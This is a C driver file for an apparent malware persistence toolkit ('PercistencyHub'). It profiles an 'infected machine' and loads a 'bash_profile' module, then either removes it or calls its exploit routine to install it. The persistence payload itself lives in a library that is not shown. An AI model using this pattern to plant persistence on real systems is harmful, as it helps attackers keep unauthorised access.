// Include needed libraries
#include <stdio.h>
#include "../../headers/library/percistency_hub.h"

// Define constants
#define                 LOGGING                             0
#define                 SEARCHED_MODULE                     "bash_profile"

// Main function
int main(){

	ENVIRONMENT *env = NULL;
	MODULE_WALLET *wallet = NULL;
	LOADED_MODULE *module = NULL;
	
	#if LOGGING

		int i;
	
	#endif

	// Test basic setup
	autoset_environment(&env, "/root/Desktop/PercistencyHub/sources");
	get_all_modules(&wallet);

	// Print basic information about infected machine
	#if LOGGING

		printf("[+] Information about infected machine:\n");
		printf("- operating system: ");
		switch (env->operating_system){
			case WINDOWS:
				printf("Windows");
				break;
			case LINUX:
				printf("Linux");
				break;
			case OTHERS:
				printf("unknown");
				break;
		}
		printf("\n- having root: ");
		switch (env->is_root){
			case WITH_ROOT:
				printf("yes");
				break;
			case WITHOUT_ROOT:
				printf("no");
				break;
		}
		printf("\n- architecture: ");
		switch (env->architecture){
			case X32:
				printf("x32");
				break;
			case X64:
				printf("x64");
				break;
			case UNKNOWN:
				printf("unknown");
				break;
		}

		// Iterate
		printf("\n\n[+] Available modules:\n");
		for (i = 0; i < wallet->count; i++){
			printf("- %s\n", wallet->names[i]);
		}

	#endif

	// Search module
	if (is_module_present(wallet, SEARCHED_MODULE) >= 0){

		#if LOGGING

			printf("\n[+] Module '" SEARCHED_MODULE "' is present in the wallet\n");
	
		#endif

		// Load module
		load_module(&module, SEARCHED_MODULE);

		// Exploit
		if (module->is_installed(env) > 0)
			module->delete_installed(env);
		else 
			if (module->is_compatible(env) >= 0)
				module->exploit(env);

		// Unlink
		unlink_module(&module);

	}
	else

		#if LOGGING

			printf("\n[!] Module '" SEARCHED_MODULE "' is not present in the wallet\n");

		#endif

	// Free
	free_environment(&env);
	free_module_wallet(&wallet);

}